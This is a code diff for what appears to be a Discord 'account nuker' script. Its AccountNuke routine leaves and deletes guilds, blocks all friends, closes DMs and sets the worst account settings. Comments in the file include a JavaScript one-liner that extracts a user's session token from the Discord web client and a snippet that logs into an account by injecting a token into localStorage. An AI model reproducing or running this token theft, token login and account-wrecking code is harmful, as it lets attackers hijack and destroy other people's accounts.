@@ -1,9 +1,8 @@
-from AresCore import BlockFriends, LeaveGuilds, CreateGuilds, SetWorstSettings
+from AresCore import BlockFriends, LeaveGuilds, CreateGuilds, DeleteGuilds, SetWorstSettings, CloseDMs
 from AresCore import CheckToken, IsGuild, GetAllGuilds
 from Utils import clear
 from rich import print as rprint
 import global_vars, os
-
 
 config = global_vars.config
 token = config['account']['token']
@@ -20,23 +19,15 @@ def user_check() -> None:
 
 
 def AccountNuke() -> None:
-	SetWorstSettings()
 	LeaveGuilds()
+	DeleteGuilds()
 	BlockFriends()
+	CloseDMs()
 	# CreateGuilds()
+	SetWorstSettings()
 
-# get token: (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+# (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
 """
-let token = "your token";
-
-function login(token) {
-    setInterval(() => {
-      document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
-    }, 50);
-    setTimeout(() => {
-      location.reload();
-    }, 2500);
-  }
-
+let token = "your token";function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 2500);}
 login(token);
 """
